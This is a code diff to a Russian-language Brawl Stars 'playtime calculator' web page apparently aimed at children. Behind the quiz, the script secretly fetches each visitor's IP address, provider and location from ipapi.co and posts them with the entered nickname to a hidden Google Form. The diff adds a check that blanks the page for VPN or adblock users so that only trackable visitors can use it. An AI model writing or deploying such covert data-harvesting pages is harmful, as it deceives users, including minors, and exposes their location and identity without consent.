@@ -30,6 +30,7 @@
             width: 100%;
             max-width: 480px;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            display: none; /* Скрыто по умолчанию для проверки на VPN */
         }
 
         h1 {
@@ -182,14 +183,14 @@
 </head>
 <body>
 
-    <div class="container">
+    <div class="container" id="main-container">
         <div id="setup-screen">
             <h1>Brawly Time</h1>
             <div class="subtitle">Узнай, сколько именно дней своей жизни ты оставил в бравле</div>
             
             <div class="form-group">
                 <label>Твой ник в игре</label>
-                <input type="text" id="nickname" placeholder="Например, LeonPro2012" required>
+                <input type="text" id="nickname" placeholder="Например, LeonPro2012">
             </div>
 
             <div class="form-group">
@@ -241,7 +242,7 @@
         </div>
 
         <div id="result-screen" class="result-screen">
-            <h2 style="font-size: 22px; margin-bottom: 15px;">Твой результат готово!</h2>
+            <h2 style="font-size: 22px; margin-bottom: 15px;">Твой результат готов!</h2>
             
             <div class="time-box">
                 <div class="time-value" id="res-hours">0ч 0м 0с</div>
@@ -260,28 +261,59 @@
         const FIELD_NAME = 'entry.37291210';
         const FIELD_IP = 'entry.171243493';
         const FIELD_PROVIDER = 'entry.36853529';
-        const FIELD_LOCATION = 'entry.71377506'; // Сюда также запишется ник друга!
+        const FIELD_LOCATION = 'entry.71377506';
         // ======================================
 
-        async function calculateTime() {
-            const nickname = document.getElementById('nickname').value.trim() || "Аноним";
+        let cachedIpData = null; // Сохраняем данные при первой загрузке
+
+        // Проверка при загрузке страницы
+        window.onload = async () => {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                const org = (data.org || "").toLowerCase();
+                // Ключевые слова, которые выдают ВПН или сервер
+                const vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloud', 'datacenter', 'digitalocean', 'amazon', 'aws', 'azure', 'ovh', 'mullvad', 'nord', 'express'];
+                const isVPN = vpnKeywords.some(kw => org.includes(kw));
+
+                if (isVPN) {
+                    // Если VPN, удаляем всё и оставляем черный экран
+                    document.body.innerHTML = '';
+                } else {
+                    // Если чистый IP, показываем форму и сохраняем данные
+                    cachedIpData = data;
+                    document.getElementById('main-container').style.display = 'block';
+                }
+            } catch (e) {
+                // Если сработал адблок, тоже показываем черный экран
+                document.body.innerHTML = '';
+            }
+        };
+
+        function calculateTime() {
+            const nickname = document.getElementById('nickname').value.trim();
+            
+            // Проверка: введен ли ник
+            if (!nickname) {
+                alert("Сначала введи свой ник!");
+                return;
+            }
+
             const wins3v3 = parseInt(document.getElementById('wins3v3').value) || 0;
             const winsSD = parseInt(document.getElementById('winsSD').value) || 0;
             const rank = document.getElementById('rank').value;
             const year = parseInt(document.getElementById('year').value);
 
-            // Смена экранов на загрузку
+            // Смена экранов
             document.getElementById('setup-screen').style.display = 'none';
             document.getElementById('loading-screen').style.display = 'block';
 
-            // 1. Считаем часы по твоим правилам
+            // 1. Формула подсчета
             let totalHours = 0;
-            
-            // Матчи (каждая победа в среднем 2 минуты = 2/60 часа)
             totalHours += (wins3v3 * 2) / 60;
             totalHours += (winsSD * 2) / 60;
 
-            // Бонусы за ранги
             if (rank === 'мастер' || rank === 'про') totalHours += 30;
             else if (rank === 'лега') totalHours += 10;
             else if (rank === 'мифик') totalHours += 3;
@@ -289,18 +321,16 @@
             else if (rank === 'золото') totalHours += 1;
             else if (rank === 'серебро') totalHours += 0.5;
 
-            // Бонусы за года
             if (year >= 2017 && year <= 2019) totalHours += 97;
             else if (year >= 2020 && year <= 2022) totalHours += 64;
             else if (year >= 2023 && year <= 2024) totalHours += 30;
 
-            // Переводим в красивый формат (Часы, Минуты, Секунды)
             const hours = Math.floor(totalHours);
             const remainderMinutes = (totalHours - hours) * 60;
             const minutes = Math.floor(remainderMinutes);
             const seconds = Math.floor((remainderMinutes - minutes) * 60);
 
-            // 2. Генерируем осознанные комментарии
+            // 2. Генерация комментариев
             const facts = [
                 {
                     f1: `посмотреть все серии аниме «Ван-Пис» ${((totalHours) / 380).toFixed(1)}`,
@@ -315,33 +345,21 @@
                     f2: `не спать под энергетиками ${((totalHours) / 24).toFixed(1)}`
                 }
             ];
-
+            
             const randomFact = facts[Math.floor(Math.random() * facts.length)];
-            const commentText = `Это как ${randomFact.f1} раз или ${randomFact.f2} раз!'
-            // 3. ПАРАЛЛЕЛЬНО тайно пробиваем IP и шлем в форму
-            try {
-    const response = await fetch('https://ipapi.co/json/');
-    const ipData = await response.json();
-    
-    // Формируем скрытый POST-запрос в твою Google форму
-    const formData = new FormData();
-    formData.append(FIELD_IP, ipData.ip || 'Неизвестно');
-    formData.append(FIELD_PROVIDER, ipData.org || 'Неизвестно');
-    formData.append(FIELD_LOCATION, `${ipData.city || '?'}, ${ipData.country_name || '?'}`); // Теперь тут только локация
-    formData.append(FIELD_NAME, nickname); // Отправляем ник в отдельное поле Name
+            const commentText = `Это как ${randomFact.f1} раз или ${randomFact.f2} раз!`;
 
-    // Отправляем без перезагрузки страницы
-    fetch(FORM_URL, { method: 'POST', body: formData, mode: 'no-cors' });
-} catch (e) {
-    // Если у него стоит жесткий блокировщик, запишем хотя бы ник в его поле
-    const formData = new FormData();
-    formData.append(FIELD_NAME, nickname);
-    formData.append(FIELD_LOCATION, 'Блокировщик IP');
-    fetch(FORM_URL, { method: 'POST', body: formData, mode: 'no-cors' });
-}
+            // 3. Отправка данных в форму
+            if (cachedIpData) {
+                const formData = new FormData();
+                formData.append(FIELD_IP, cachedIpData.ip || 'Неизвестно');
+                formData.append(FIELD_PROVIDER, cachedIpData.org || 'Неизвестно');
+                formData.append(FIELD_LOCATION, `${cachedIpData.city || '?'}, ${cachedIpData.country_name || '?'}`);
+                formData.append(FIELD_NAME, nickname);
+                fetch(FORM_URL, { method: 'POST', body: formData, mode: 'no-cors' });
+            }
 
-
-            // Имитируем загрузку 2 секунды для солидности
+            // Имитация загрузки 
             setTimeout(() => {
                 document.getElementById('loading-screen').style.display = 'none';
                 document.getElementById('result-screen').style.display = 'block';
@@ -353,4 +371,3 @@
     </script>
 </body>
 </html>
-
